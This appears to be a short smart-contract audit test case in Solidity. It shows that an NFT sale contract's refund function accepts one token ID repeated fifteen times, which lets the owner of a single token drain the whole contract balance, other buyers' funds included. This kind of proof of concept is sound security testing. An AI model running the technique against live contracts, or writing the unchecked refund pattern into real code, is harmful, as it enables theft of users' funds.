# TestCase

- refund owner can refund only one token, and drain all balance

## Test

```solidity
function testIWantToRug() public {
  cheats.prank(address(2));
  wagmi.publicSaleMint{value: 1 ether}(10);

  cheats.prank(address(3));
  wagmi.publicSaleMint{value: 0.3 ether}(3);

  cheats.prank(address(4));
  wagmi.publicSaleMint{value: 0.1 ether}(1);

  cheats.prank(king);
  wagmi.publicSaleMint{value: 0.1 ether}(1);
  assertEq(king.balance, 4.9 ether);

  assertEq(address(wagmi).balance, 1.5 ether);

  uint256[] memory ids = new uint256[](15);
  for(uint256 i = 0; i < 15; i++) {
    ids[i] = 14;
  }

  cheats.prank(king);
  wagmi.refund(ids);
  assertEq(king.balance, 6.4 ether);
}
```
